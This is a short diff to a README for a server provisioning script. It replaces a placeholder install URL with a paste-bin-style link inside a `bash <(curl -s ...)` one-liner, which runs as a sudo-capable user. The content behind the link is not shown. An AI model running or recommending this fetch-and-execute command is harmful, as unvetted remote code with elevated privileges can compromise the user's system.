@@ -17,7 +17,7 @@ This repository provides a production-grade provisioning script to set up a secu
 Run the following command to download and execute the setup script. This must be run as a regular user with `sudo` privileges.
 
 ```bash
-bash <(curl -s http://mywebsite.example/myscript.txt)
+bash <(curl -s https://bin.blockloom.ch/dotQO7Dg)
 ```
 
 > **Note**: The script will automatically detect your OS, install dependencies, and apply configurations.
